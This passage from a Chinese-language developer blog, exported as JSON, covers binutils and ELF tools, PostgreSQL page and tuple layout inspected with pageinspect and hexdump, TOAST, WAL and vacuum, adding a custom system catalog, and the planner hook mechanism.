–help：显示nm的选项。 objdumpogjdump工具用来显示二进制文件的信息，就是以一种可阅读的格式让你更多地了解二进制文件可能带有的附加信息。 -f 显示文件头信息 -D 反汇编所有section (-d反汇编特定section) -h 显示目标文件各个section的头部摘要信息 -x 显示所有可用的头信息，包括符号表、重定位入口。-x 等价于 -a -f -h -r -t 同时指定。 -i 显示对于 -b 或者 -m 选项可用的架构和目标格式列表。 -r 显示文件的重定位入口。如果和-d或者-D一起使用，重定位部分以反汇编后的格式显示出来。 -R 显示文件的动态重定位入口，仅仅对于动态目标文件有意义，比如某些共享库。 -S 尽可能反汇编出源代码，尤其当编译的时候指定了-g这种调试参数时，效果比较明显。隐含了-d参数。 -t 显示文件的符号表入口。类似于nm -s提供的信息 readelf这个工具和objdump命令提供的功能类似，但是它显示的信息更为具体，并且它不依赖BFD库(BFD库是一个GNU项目，它的目标就是希望通过一种统一的接口来处理不同的目标文件） ELF文件类型 ELF(Executable and Linking Format)是一种对象文件的格式，用于定义不同类型的对象文件(Object files)中都放了什么东西、以及都以什么样的格式去放这些东西。它自最早在 System V 系统上出现后，被 xNIX 世界所广泛接受，作为缺省的二进制文件格式来使用。可以说，ELF是构成众多xNIX系统的基础之一。 ELF文件有三种类型： 可重定位的对象文件(Relocatable file)由汇编器汇编生成的 .o 文件 可执行的对象文件(Executable file)可执行应用程序 可被共享的对象文件(Shared object file)动态库文件，也即 .so 文件 .text section 里装载了可执行代码； .data section 里面装载了被初始化的数据； .bss section 里面装载了未被初始化的数据； 以 .rec 打头的 sections 里面装载了重定位条目； .symtab 或者 .dynsym section 里面装载了符号信息； .strtab 或者 .dynstr section 里面装载了字符串信息； linux-readelf arLinux ar命令用于建立或修改备存文件，或是从备存文件中抽取文件。ar可让您集合许多文件，成为单一的备存文件。在备存文件中，所有成员文件皆保有原来的属性与权限。 必要参数： -d 删除备存文件中的成员文件。 -m 变更成员文件在备存文件中的次序。 -p 显示备存文件中的成员文件内容。 -q 将文件附加在备存文件末端。 -r 将文件插入备存文件中。 -t 显示备存文件中所包含的文件。 -x 自备存文件中取出成员文件。 选项参数： a&lt;成员文件&gt; 将文件插入备存文件中指定的成员文件之后。 b&lt;成员文件&gt; 将文件插入备存文件中指定的成员文件之前。 c 建立备存文件。 f 为避免过长的文件名不兼容于其他系统的ar指令指令，因此可利用此参数，截掉要放入备存文件中过长的成员文件名称。 i&lt;成员文件&gt; 将问家插入备存文件中指定的成员文件之前。 o 保留备存文件中文件的日期。 s 若备存文件中包含了对象模式，可利用此参数建立备存文件的符号表。 S 不产生符号表。 u 只将日期较新文件插入备存文件中。 v 程序执行时显示详细的信息。 V 显示版本信息。","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"}]},{"title":"Postgresql开发 Page","slug":"database/PostgreSql-page","date":"2018-10-09T12:13:41.000Z","updated":"2019-09-18T12:18:54.235Z","comments":true,"path":"2018/10/09/database/PostgreSql-page/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/10/09/database/PostgreSql-page/","excerpt":"本文章基于Postgresql 9.5 Page数据页结构 tablepce、table、toast、index数据文件位置 hexpdump解析数据文件","text":"本文章基于Postgresql 9.5 Page数据页结构 tablepce、table、toast、index数据文件位置 hexpdump解析数据文件 Page结构PG数据表存储在N个数据文件中，每个数据文件有N个Page(大小默认为8K，可在编译安装时指定)组成，Page为Pg最小存取单元。 数据页8Kb = 8 * 1024 Byte， 其中分为五部分: PageHeaderData: 24字节长，包含关于页面的一般信息，包括空闲空间指针。24Byte; ItemIdData: 一个记录(偏移量，长度)对的数组，指向实际项。 4Byte; Free Space: 为分配的空间(空闲空间) 新itemIdData指针从头部开始分配 新数据Items从结尾开始分配 Items 实际的项本身 – 实际结构取决于表包含的内容，表和序列都是用HeapTupleHeaderData结构, 索引需要不同对待。 Special Space 索引访问模式相关的数据。不同的索引访问方式存放不同的数据。在普通表中为空。 1234567891011121314151617181920212223242526272829303132333435/* include/stotage/bufpage.h * disk page organization * * space management information generic to any page * * pd_lsn - identifies xlog record for last change to this page. * pd_checksum - page checksum, if set. * pd_flags - flag bits. * pd_lower - offset to start of free space. * pd_upper - offset to end of free space. * pd_special - offset to start of special space. * pd_pagesize_version - size in bytes and page layout version number. * pd_prune_xid - oldest XID among potentially prunable tuples on page.*/typedef struct&#123; uint32 xlogid; /* high bits */ //4Byte uint32 xrecoff; /* low bits */ //4Byte&#125; PageXLogRecPtr;typedef struct PageHeaderData&#123; /* XXX LSN is member of *any* block, not only page-organized ones */ PageXLogRecPtr pd_lsn; /* LSN: next byte after last byte of xlog * record for last change to this page */ // 8Byte uint16 pd_checksum; /* checksum */ //2Byte uint16 pd_flags; /* flag bits, see below */ //2Byte LocationIndex pd_lower; /* offset to start of free space */ //2Byte LocationIndex pd_upper; /* offset to end of free space */ //2Byte LocationIndex pd_special; /* offset to start of special space */ //2Byte uint16 pd_pagesize_version; //2Byte TransactionId pd_prune_xid; /* oldest prunable XID, or zero if none */ //4Byte ItemIdData pd_linp[FLEXIBLE_ARRAY_MEMBER]; /* line pointer array */&#125; PageHeaderData; pg_lsn：记录最后一次对page修改的xlog记录id。 pg_checksum：页面的校验和，主要是通过函数pg_checksum_block函数生成的，0也是有效地，参数为PageHeaderData和BLCKSZ(page’s size)。当校验和验证失败，即认为当前页面无效。 pg_flags：page的flags，具体值为，可以叠加: 123456#define PD_HAS_FREE_LINES 0x0001 /* are there any unused line pointers? */#define PD_PAGE_FULL 0x0002 /* not enough free space for new * tuple? */#define PD_ALL_VISIBLE 0x0004 /* all tuples on page are visible to * everyone */#define PD_VALID_FLAG_BITS 0x0007 /* OR of all valid pd_flags bits */ pg_lower和pg_upper：最后一个项指针的位置和最新的tuple位置。主要进行查找空闲位置，进行插入工作。 pg_special：page预留的位置，可以存储索引等信息。 pg_pagesize_version：page大小以及当前版本。page大小可以通过configure进行设置。version的意思是 123456789101112/* * Page layout version number 0 is for pre-7.3 Postgres releases. * Releases 7.3 and 7.4 use 1, denoting a new HeapTupleHeader layout. * Release 8.0 uses 2; it changed the HeapTupleHeader layout again. * Release 8.1 uses 3; it redefined HeapTupleHeader infomask bits. * Release 8.3 uses 4; it changed the HeapTupleHeader layout again, and * added the pd_flags field (by stealing some bits from pd_tli), * as well as adding the pd_prune_xid field (which enlarges the header). * * As of Release 9.3, the checksum version must also be considered when * handling pages. */ pg_prune_xid: 一般是最后一次删除或者更新的xid; pg_linp 项指针; ItemIdData指向指针: 12345678typedef struct ItemIdData&#123; unsigned lp_off:15, /* offset to tuple (from start of page) */ //指向Items; lp_flags:2, /* state of item pointer, see below */ lp_len:15; /* byte length of tuple */ &#125; ItemIdData;typedef ItemIdData *ItemId; 表与序列的结构HeapTupleHeaderData Tuple 头部信息 实际数据信息 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051typedef struct HeapTupleFields&#123; TransactionId t_xmin; /* inserting xact ID */ TransactionId t_xmax; /* deleting or locking xact ID */ union &#123; CommandId t_cid; /* inserting or deleting command ID, or both */ TransactionId t_xvac; /* old-style VACUUM FULL xact ID */ &#125; t_field3;&#125; HeapTupleFields;typedef struct DatumTupleFields&#123; int32 datum_len_; /* varlena header (do not touch directly!) */ int32 datum_typmod; /* -1, or identifier of a record type */ Oid datum_typeid; /* composite type OID, or RECORDOID */ /* * Note: field ordering is chosen with thought that Oid might someday * widen to 64 bits. */&#125; DatumTupleFields;typedef struct BlockIdData&#123; uint16 bi_hi; uint16 bi_lo;&#125; BlockIdData;typedef struct ItemPointerData&#123; BlockIdData ip_blkid; OffsetNumber ip_posid; // uint16&#125;struct HeapTupleHeaderData &#123; union &#123; HeapTupleFields t_heap; DatumTupleFields t_datum; &#125; t_choice; ItemPointerData t_ctid; /* current TID of this or newer tuple (or a * speculative insertion token) */ /* Fields below here must match MinimalTupleData! */ uint16 t_infomask2; /* number of attributes + various flags */ //2Byte uint16 t_infomask; /* various flag bits, see below */ //2Byte uint8 t_hoff; /* sizeof header incl. bitmap, padding */ //1Byte /* ^ - 23 bytes - ^ */ bits8 t_bits[FLEXIBLE_ARRAY_MEMBER]; /* bitmap of NULLs */ /* MORE DATA FOLLOWS AT END OF STRUCT */&#125;; Rel结构体展开 12345678910Field Type Length Offset Descriptiont_xmin TransactionId 4 bytes 0 insert XID stampt_xmax TransactionId 4 bytes 4 delete XID stampt_cid CommandId 4 bytes 8 insert and/or delete CID stamp (overlays with t_xvac)t_xvac TransactionId 4 bytes 8 XID for VACUUM operation moving a row versiont_ctid ItemPointerData 6 bytes 12 current TID of this or newer row versiont_infomask2 uint16 2 bytes 18 number of attributes, plus various flag bitst_infomask uint16 2 bytes 20 various flag bitst_hoff uint8 1 byte 22 offset to user data//注意：t_cid和t_xvac为联合体，共用存储空间 xmin 和 xmax 是插入，删除，更新操作时的事务ID，插入时会在xmin内写入当前事务ID，删除时在xmax写入当前事务ID，更新是进行删除后再插入。 t_cid 是指一个事务内的命令ID, 每个事务都从0开始。 t_ctid 物理ID。 t_infomask2 取值 1234567891011/* * information stored in t_infomask2: */#define HEAP_NATTS_MASK 0x07FF /* 11 bits for number of attributes *//* bits 0x1800 are available */#define HEAP_KEYS_UPDATED 0x2000 /* tuple was updated and key cols * modified, or tuple deleted */#define HEAP_HOT_UPDATED 0x4000 /* tuple was HOT-updated */#define HEAP_ONLY_TUPLE 0x8000 /* this is heap-only tuple */#define HEAP2_XACT_MASK 0xE000 /* visibility-related bits */ t_infomask 取值: 123456789101112131415161718192021222324252627282930313233/* * information stored in t_infomask: */#define HEAP_HASNULL 0x0001 /* has null attribute(s) */#define HEAP_HASVARWIDTH 0x0002 /* has variable-width attribute(s) */#define HEAP_HASEXTERNAL 0x0004 /* has external stored attribute(s) */#define HEAP_HASOID 0x0008 /* has an object-id field */#define HEAP_XMAX_KEYSHR_LOCK 0x0010 /* xmax is a key-shared locker */#define HEAP_COMBOCID 0x0020 /* t_cid is a combo cid */#define HEAP_XMAX_EXCL_LOCK 0x0040 /* xmax is exclusive locker */#define HEAP_XMAX_LOCK_ONLY 0x0080 /* xmax, if valid, is only a locker */ /* xmax is a shared locker */#define HEAP_XMAX_SHR_LOCK (HEAP_XMAX_EXCL_LOCK | HEAP_XMAX_KEYSHR_LOCK)#define HEAP_LOCK_MASK (HEAP_XMAX_SHR_LOCK | HEAP_XMAX_EXCL_LOCK | \\ HEAP_XMAX_KEYSHR_LOCK)#define HEAP_XMIN_COMMITTED 0x0100 /* t_xmin committed */#define HEAP_XMIN_INVALID 0x0200 /* t_xmin invalid/aborted */#define HEAP_XMIN_FROZEN (HEAP_XMIN_COMMITTED|HEAP_XMIN_INVALID)#define HEAP_XMAX_COMMITTED 0x0400 /* t_xmax committed */#define HEAP_XMAX_INVALID 0x0800 /* t_xmax invalid/aborted */#define HEAP_XMAX_IS_MULTI 0x1000 /* t_xmax is a MultiXactId */#define HEAP_UPDATED 0x2000 /* this is UPDATEd version of row */#define HEAP_MOVED_OFF 0x4000 /* moved to another place by pre-9.0 * VACUUM FULL; kept for binary * upgrade support */#define HEAP_MOVED_IN 0x8000 /* moved from another place by pre-9.0 * VACUUM FULL; kept for binary * upgrade support */#define HEAP_MOVED (HEAP_MOVED_OFF | HEAP_MOVED_IN)#define HEAP_XACT_MASK 0xFFF0 /* visibility-related bits */ t_hoff： HeapTupleHeaderData长度，如果有OID会增加4，受字节对齐影响，会增加8 t_bits： 指向实际具体数据。 tablespace 位置查看数据文件首先知道数据文件存放于表空间下，首先需要知道表空间OId 1234567Postgres=# select oid, datname from pg_database ; oid | datname -------+----------- 1 | template1 13356 | template0 13361 | highgo 16384 | Postgres 其次表空间分为系统表空间与用户自定义表空间。 PG系统表空间默认有两个:pg_default 和 pg_global pg_default 的文件存放在PGDATA/base目录下 pg_global 的文件存放在PGDATA/global目录下。 用户自定义的表空间在PGDATA/pg_tblspc存在一个软连接，指向实际的存放目录 create tablespace 指定的location 软连接以表空间OID命名。 1234567Postgres=# create tablespace test owner Postgres LOCATION &apos;/home/Postgres/db&apos;;Postgres=# select oid, * from pg_tablespace ;oid | spcname | spcowner | spcacl | spcoptions -------+------------+----------+--------+------------ 1663 | pg_default | 10 | | 1664 | pg_global | 10 | | 16389 | test | 10 | | 12shell$ /home/Postgres/dbtest/pg_tblspc0 lrwxrwxrwx. 1 Postgres Postgres 15 Oct 7 10:28 16389 -&gt; /home/Postgres/db table 位置pg中每个表都是一个文件，文件以filenode命名。filenode的值可以从pg_class的relfilenode字段获取。当表大小超过1G的时候，表文件会被分割,第一个文件的名字是filenode，第二个则是filenode.1 依次后推，表文件大小限额1G是PG默认值，该值可以通过编译–with-segsize来改变。 方法一 1234Postgres=# select relname, relfilenode, relnamespace from pg_class where relname = 'pagetest'; relname | relfilenode | relnamespace ----------+-------------+-------------- pagetest | 16406 | 2200 方法二 123Postgres=# select pg_relation_filepath(&apos;pagetest&apos;);-[ RECORD 1 ]--------+-----------------pg_relation_filepath | base/16384/16406 在表空间目录下, 通常与表Filenode相关的还有两个文件， filenode_fsm 和 filenode_vm .fsm 文件为 free space map. 用于跟踪表文件中的空闲空间。vm 文件为 visibility map. 用于跟踪哪些page包含对所有事务都可见的tuple。 index 位置在Pagetest表上创建索引 1Postgres=# create index ON pagetest using brin ( id ); 查看索引存放文件位置: 1234Postgres=# select pg_relation_filepath('pagetest_id_idx'); pg_relation_filepath ---------------------- base/16384/16409 Pageinspect查看Page内容安装 123cd $PGSRC/contrib/pageinspectmakemake install 简单使用 1create extension pageinspect ; Table查看raw_page 十六进制内容: 123\\x # Expanded display is on.select * from get_raw_page('pagetest', 0); header &amp; items; 123456789101112131415Postgres=# select * from page_header(get_raw_page(&apos;pagetest&apos;,0)); lsn | checksum | flags | lower | upper | special | pagesize | version | prune_xid -----------+----------+-------+-------+-------+---------+----------+---------+----------- 0/185E030 | 0 | 0 | 40 | 8032 | 8192 | 8192 | 4 | 0(1 row)Postgres=# select * from heap_page_items(get_raw_page(&apos;pagetest&apos;,0)); lp | lp_off | lp_flags | lp_len | t_xmin | t_xmax | t_field3 | t_ctid | t_infomask2 | t_infomask | t_hoff | t_bits | t_oid ----+--------+----------+--------+--------+--------+----------+--------+-------------+------------+--------+--------+------- 1 | 8152 | 1 | 39 | 1842 | 0 | 0 | (0,1) | 3 | 2306 | 24 | | 2 | 8112 | 1 | 39 | 1843 | 0 | 0 | (0,2) | 3 | 2306 | 24 | | 3 | 8072 | 1 | 39 | 1844 | 0 | 0 | (0,3) | 3 | 2306 | 24 | | 4 | 8032 | 1 | 39 | 1845 | 0 | 0 | (0,4) | 3 | 2306 | 24 | | (4 rows) update： page_items 变化 12345678Postgres=# select * from heap_page_items(get_raw_page('pagetest', 0)); lp | lp_off | lp_flags | lp_len | t_xmin | t_xmax | t_field3 | t_ctid | t_infomask2 | t_infomask | t_hoff | t_bits | t_oid ----+--------+----------+--------+--------+--------+----------+--------+-------------+------------+--------+--------+------- 1 | 8152 | 1 | 39 | 1842 | 0 | 0 | (0,1) | 3 | 2306 | 24 | | 2 | 8112 | 1 | 39 | 1843 | 0 | 0 | (0,2) | 3 | 2306 | 24 | | 3 | 8072 | 1 | 39 | 1844 | 0 | 0 | (0,3) | 3 | 2306 | 24 | | 4 | 8032 | 1 | 39 | 1845 | 1846 | 0 | (0,5) | 16387 | 258 | 24 | | 5 | 7992 | 1 | 39 | 1846 | 0 | 0 | (0,5) | 32771 | 10242 | 24 | | 第4条记录 t_xmax 被修改为 1846 , t_xmax 只有被delete的时候才会被标记， 而第五条记录发现t_xmin被修改为1846，说明是同一事务进行操作，说明进行的操作为update; insert page_header变化 12345Postgres=# select * from page_header(get_raw_page('pagetest',0)); lsn | checksum | flags | lower | upper | special | pagesize | version | prune_xid -----------+----------+-------+-------+-------+---------+----------+---------+----------- 0/18603F0 | 0 | 0 | 48 | 7952 | 8192 | 8192 | 4 | 1846(1 row) 进行insert操作insert into pagetest values ( 7, &#39;7&#39;, &#39;g&#39; ); 123 lsn | checksum | flags | lower | upper | special | pagesize | version | prune_xid -----------+----------+-------+-------+-------+---------+----------+---------+----------- 0/1860460 | 0 | 0 | 52 | 7912 | 8192 | 8192 | 4 | 1846 比较发现 lsn, lower, upper 三项发生了变化。lsn 记录最后一次对page修改的xlog记录idlower 每次从前向后申请 4Byte字节upper 每次从后向前从Free Space申请39字节，因为字节对齐 申请40Byte; index查看索引类型: 123456789Postgres=# \\d pagetest Table \"public.pagetest\" Column | Type | Modifiers --------+-----------------------+----------- id | integer | c1 | character(8) | c2 | character varying(16) | Indexes: \"pagetest_id_idx\" brin (id) 查看Page Header; 1234Postgres=# SELECT * from page_header(get_raw_page('pagetest_id_idx', 0)); lsn | checksum | flags | lower | upper | special | pagesize | version | prune_xid -----------+----------+-------+-------+-------+---------+----------+---------+----------- 0/1872A90 | 0 | 0 | 24 | 8184 | 8184 | 8192 | 4 | 0 根据pageinspect提供相关索引进行查看信息:不同类型索引使用的存储结构不同; 常见索引如下: brin btree gin gist hash spgist hexdump 解析数据文件可以对照pageinspesct 进行信息对照。 123shell$ hexdump -C 16406 -s 0 -n 800000000 00 00 00 00 / 30 e0 85 01 |....0...|00000008 前4Byte是TimeLineID 0x00000000 后4Byte是 0x0185e030 组合 0/185e030 ItemIdData: 123456789Postgres$ hexdump -C 16406 -s 24 -n 400000018 d8 9f 4e 00 |..N.|0000001cPostgres$ echo $(( 0x9fd8 &amp; ~(1 &lt;&lt; 15) )) ## 取低15位，指向Items;-实际项;8152Postgres$ echo $(( 0x004e &gt;&gt; 1 )) ## 取高15位； 得到lp_len (Tuple元组 length)39 第一个Tuple偏移8152Byte; 1hexdump -C 16406 -s 8152 -n 39 itemidData-&gt;lp_len = 39; t_hoff = 24; ==&gt; hexdump -C 16406 -s 8152+22 -n 1 第一条Tuple元组信息 size = 39 - 24 = 15; 12345678910Postgres$ hexdump -C 16406 -s 8152+t_hoff -n (itemidData-&gt;lp_len - t_hoff)01 00 00 00 13 31 20 20 20 20 20 20 20 05 61 |.....1 .a|回顾我们的表结构：create table pagetest (id int,c1 char(8),c2 varchar(16));第1个字段为int，第2个字段为定长字符，第3个字段为变长字符。相应的数据：id=\\x00000001，数字1c1=\\x133120202020202020，字符串，无需高低位变换，第1个字节\\x13为标志位，后面是字符'1'+7个空格 ascii-&gt;hex;c2=\\x0561，字符串，第1个字节\\x05为标志位，后面是字符'a' 那么第二条，则是, 因为实际数据申请，从文件向前申请。 1234hexdump -C 16406 -s 8152+t_hoff-itemidData-&gt;lp_len -n 15==&gt;hexdump -C 16406 -s 8137 -n 15 00 00 00 13 32 20 20 20 20 20 20 20 05 62 00 |....2 .b.| 补充: Tuple中变长字段尤其需要注意，因为其保存大尺寸数据，很容易超过Page大小，Postgresql不允许一行数据跨Page存储。因此引入TOAST机制来处理。采用压缩 + 切片的方法将大数据分割成小数据，变成多行保存在对用的toast表中，并对它们进行索引。所以从文件角度来看，一行大数据可能被分割存在于多个数据文件中。(普通表与toast表分别对应的文件)。 查看Pagetest普通表与它的toast表: 1234Postgres=# select oid, relname, relnamespace, relfilenode, reltablespace, relpages, reltuples, reltoastrelid, relkind from pg_class where relname = 'pagetest'; oid | relname | relnamespace | relfilenode | reltablespace | relpages | reltuples | reltoastrelid | relkind -------+----------+--------------+-------------+---------------+----------+-----------+---------------+--------- 16406 | pagetest | 2200 | 16406 | 0 | 1 | 6 | 0 | r 所有的toast表都在模式(schema)pg_toast下，查看toast表结构和数据: 123456789\\d+ pg_toast.pg_toast_2606TOAST table \"pg_toast.pg_toast_2606\" Column | Type | Storage ------------+---------+--------- chunk_id | oid | plain chunk_seq | integer | plain chunk_data | bytea | plainInvalid command \\. Try \\? for help. chunk_id 具有同样的chunk_id值得所有行组成原表的toast字段的一行数据。 chunk_seq 表示该行切片数据在完整数据中的顺序。 chunk_data 实际存储的切片数据。 一张普通的表最多对应一张toast表，但是每个字段根据不同的数据类型具有不同的toast策略。修改toast策略，不会影响已有的数据存放方式。 plain：不压缩，不切片。不会触发toast机制。 extended：优先压缩，后切片。 external：不压缩，只切片。用空间换时间的策略，提高操作效率。 main：尽量不切片。 12345678910Postgres=# \\d+ pagetest Table \"public.pagetest\" Column | Type | Modifiers | Storage | Stats target | Description --------+-----------------------+-----------+----------+--------------+------------- id | integer | | plain | | c1 | character(8) | | extended | | c2 | character varying(16) | | extended | | Indexes: \"pagetest_id_idx\" brin (id)Replica Identity: FULL 当将要保存到表的一行数据超过一个阈值(BLOCK/4 ~ 2KB)时，会触发toast机制，如果产生切片则保存到对应的toast表中。 Pageinit123456789101112131415161718192021222324// include/pg_config.h#define BLCKSZ 8192voidPageInit(Page page, Size pageSize, Size specialSize) //rocky_pageinit;&#123; PageHeader p = (PageHeader) page; specialSize = MAXALIGN(specialSize); Assert(pageSize == BLCKSZ); Assert(pageSize &gt; specialSize + SizeOfPageHeaderData); /* * Make sure all fields of page are zero, as well as unused space */ MemSet(p, 0, pageSize); p-&gt;pd_lower = SizeOfPageHeaderData; p-&gt;pd_upper = pageSize - specialSize; p-&gt;pd_special = pageSize - specialSize; PageSetPageSizeAndVersion(page, pageSize, PG_PAGE_LAYOUT_VERSION);&#125; 数据更新数据更新的最终结果就是把变更的内容持久化到硬盘上。一次事务可能涉及多个page的改变。如果直接刷盘会产生多次随机写，付出的代价相对较高。所以在涉及层面采用写缓冲，异步和WAL来解决性能上的问题,并且WAL机制也保证了事务的持久性和数据的完整性，还使得在线备份和时间回复(PITR)称为可能。 事务过程存储引擎在执行更新类操作时，首先开启事务，然后将变更后的内容记入Wal buffer, 并更新shared buffer中的page，最后提交事务，相应客户端。shared buffer中的page发生更新后被标记为dirty page，之后由其他进程完成磁盘回写。事务提交可以设置是否等待WAL记录被写入磁盘。控制参数为synchronous_commit。设置off时对性能有一定提升,程序将不会等待本次WAL记录写入到磁盘，而直接影响客户端。 WAL写入磁盘默认情况下，WAL是在事务提交时写入磁盘。以保证提交的事务不会因为宕机而丢失。当synchronous_commit设置为off时，WAL写入磁盘的过程由Wal write进程异步完成，这种情况下宕机存在丢失最近提交的事务风险。但不会影响数据库的一致性。 Dirty Page回写磁盘一般情况下，每隔一段时间writer进程就会扫描shared buffer, 将Dirty Page刷入操作系统的Page Cache，并记录处理过的Dirty Page,之后由系统内核处理page cache刷入磁盘，当空闲内存低于阈值 或 脏页驻留时间超过阈值时，触发回写磁盘。 另一种情况是由checkpointer进程定义执行checkpoint,强制当前处理过的dirty page回写磁盘，保证数据持久化，为事务前滚提供参照点。默认情况下(full_page_write = on), checkpoint发生后，在page第一次写的时候会将整个page写入WAL，以保证宕机或者备份拷贝时，产生的partial wirte page可以保证被正确的完整的page覆盖来修复。 空间回收在PostgreSQL中，delete和一些的update(例如，涉及到索引字段的更新)会使表和索引中的旧行(tuple)被废弃掉。这些废弃的tuple称之为dead tuple，他们仍然占用空间，称为一种资源浪费。 PostgreSQL的VACUUM机制就是用来回收这些dead tuple空间的，用来回收利用。 Full Vacuum 123VACUUM FULL VERBOSE;VACUUM FULL t_user_info;ANALYZE; Lazy Vacuum 12VACUUM t_user_info;VACUUM ANALYZE t_user_info; 补充Postgresql 10 数据库文件布局","categories":[{"name":"Database","slug":"Database","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/Database/"}],"tags":[{"name":"Database","slug":"Database","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Database/"},{"name":"Postgresql","slug":"Postgresql","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Postgresql/"}]},{"title":"Postgresql开发-添加系统表","slug":"database/Postgresql开发-添加系统表","date":"2018-10-06T13:15:54.000Z","updated":"2019-09-18T12:19:22.757Z","comments":true,"path":"2018/10/06/database/Postgresql开发-添加系统表/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/10/06/database/Postgresql开发-添加系统表/","excerpt":"在修改pg_proc.h 的时候，发现只要在其中编写， 就会被BKI解析 生成到Postgres.bki文件中，用于initdb重建数据库。 从而被创建； 因此想: 是否可以直接在include/catalong下添加xxx.h文件，用于创建自己定义的数据表;","text":"在修改pg_proc.h 的时候，发现只要在其中编写， 就会被BKI解析 生成到Postgres.bki文件中，用于initdb重建数据库。 从而被创建； 因此想: 是否可以直接在include/catalong下添加xxx.h文件，用于创建自己定义的数据表; 步骤1123456789101112131415161718192021#ifndef PG_ROCKY_AUDITINFO_H_#define PG_ROCKY_AUDITINFO_H_#include \"catalog/genbki.h\"#define TableAuditRelationId 3294CATALOG(pg_auditinfo,3294) &#123; Oid user; /* owner of tablespace */ text sql;&#125;FormData_pg_auditinfo;typedef FormData_pg_auditinfo* Form_pg_auditinfo;#define Natts_pg_auditinfo 2#define Anum_pg_auditinfo_user 1#define Anum_pg_auditinfo_sql 2#endif /* PG_TABLESPACE_H */ 其中Oid设置请运行 include/catalong/unused_oids 来查看未使用的Oid; 注意格式: backend/catalong/Makefile 执行时，可能存在因为格式问题报错， 注意查看是否产生报错信息 此时运行make clean; make -j2 发现，在postgre.bki 没有生成建立该表的信息。 步骤2查看当前 postgre.bki当前目录下的Makefile即backend/catalong/Makefile发现有一个变量，用于提供BKI执行文件信息: POSTGRES_BKI_SRCS 即我们在此变量中追加我们的文件名. 再从新编译make clean &amp; make 将会在postgres.bki发现建表信息 1234567create pg_auditinfo 3294( user = oid , sql = text)open pg_auditinfoclose pg_auditinfo initdb 重新建立数据库，psql 连接后执行select语句我们将发现新建表 1234Postgres=# select * from pg_auditinfo ; user | sql ------+-----(0 rows) 添加系统表声明系统表选项: 仅用于声明; BKI_BOOTSTRAP BKI_ROWTYPE_OID(oid) BKI_WITHOUT_OIDS BKI_SCHEMA_MACRO BKI_SHARED_RELATION BKI_FORCE_NULL BKI_FORCE_NOT_NULL 系统表异常警告:系统表insert into 报错: 123Postrgres=# insert into pg_auditinfo values(10, &apos;select * from dual;&apos;);WARNING: 01000: generating possibly-non-unique OID for &quot;pg_auditinfo&quot;WARNING: 01000: generating possibly-non-unique OID for &quot;pg_auditinfo&quot; 解决: include/catalog/indexing.h 12DECLARE_UNIQUE_INDEX(pg_auditinfo_oid_index, 3296, on pg_auditinfo using btree(oid oid_ops));#define AuditInfoOidIndexId 3296 在其身上创建合适的索引，即可。","categories":[{"name":"Database","slug":"Database","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/Database/"}],"tags":[{"name":"Database","slug":"Database","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Database/"},{"name":"Postgresql","slug":"Postgresql","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Postgresql/"}]},{"title":"Postgresql扩展Sql-hook","slug":"database/Postgresql扩展Sql-hook","date":"2018-09-29T13:03:38.000Z","updated":"2019-09-18T12:19:39.038Z","comments":true,"path":"2018/09/29/database/Postgresql扩展Sql-hook/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/09/29/database/Postgresql扩展Sql-hook/","excerpt":"基于PostgreSql 9.5.13 在我们查看Postgresql源码时,经常发现Hook的使用. 例如:1234567891011PlannedStmt *planner(Query *parse, int cursorOptions, ParamListInfo boundParams)&#123; PlannedStmt *result; if (planner_hook) result = (*planner_hook) (parse, cursorOptions, boundParams); else result = standard_planner(parse, cursorOptions, boundParams); return result;&#125; Hook是Window消息处理机制的一个平台，应用程序可以在上面设置子程序以监视指定窗口的某种消息，而且所监视的窗口可以是其他进程所创建的。当消息到达后，在目标窗口处理函数之前处理它, 钩子机制允许应用程序截获处理Window消息或特定事件。 即钩子先获取控制权,进行加工处理。Postgresql中的Hook机制,更多是中断与替换操作。改变其标准流程。","text":"基于PostgreSql 9.5.13 在我们查看Postgresql源码时,经常发现Hook的使用. 例如:1234567891011PlannedStmt *planner(Query *parse, int cursorOptions, ParamListInfo boundParams)&#123; PlannedStmt *result; if (planner_hook) result = (*planner_hook) (parse, cursorOptions, boundParams); else result = standard_planner(parse, cursorOptions, boundParams); return result;&#125; Hook是Window消息处理机制的一个平台，应用程序可以在上面设置子程序以监视指定窗口的某种消息，而且所监视的窗口可以是其他进程所创建的。当消息到达后，在目标窗口处理函数之前处理它, 钩子机制允许应用程序截获处理Window消息或特定事件。 即钩子先获取控制权,进行加工处理。Postgresql中的Hook机制,更多是中断与替换操作。改变其标准流程。 原理Hook本质实际就是Static的函数指针。 工作原理：每个Hook是由全局性的函数指针构成的,其默认初始化值为NULL。 当数据库调用的时候，首先会检测是否为NULL, 不是则优先调用函数，否则执行标准函数。 Hook函数指针的值改变在于服务器启动，通过函数 process_session_preload_libraries(); 加载共享库. 于.so寻找 _PG_init _PG_fini 函数,来进行函数初始化与卸载操作 [与其余插件区别在于:Hook插件有入口函数]。 在其具体操作流程，根据是否修改指定的Hook来参照是否中断或者更改其执行流程。 共享库与初始化shared_preload_libraries = &#39;&#39; 1234567891011guc.c 配置;&#123; &#123;\"shared_preload_libraries\", PGC_POSTMASTER, CLIENT_CONN_PRELOAD, //rocky_name with config; -- reload way gettext_noop(\"Lists shared libraries to preload into server.\"), NULL, GUC_LIST_INPUT | GUC_LIST_QUOTE | GUC_SUPERUSER_ONLY &#125;, &amp;shared_preload_libraries_string, //-程序变量名; \"\", NULL, NULL, NULL&#125;, 123456789//fmgr/dfmgr.c:加载共享lib库,并执行其初始化;PG_init = (PG_init_t) pg_dlsym(file_scanner-&gt;handle, \"_PG_init\");if (PG_init) (*PG_init) (); //fmgr/dfmgr.c:卸载lib库,移除hook 并 重置;PG_fini = (PG_fini_t) pg_dlsym(file_scanner-&gt;handle, \"_PG_fini\");if (PG_fini) (*PG_fini) (); 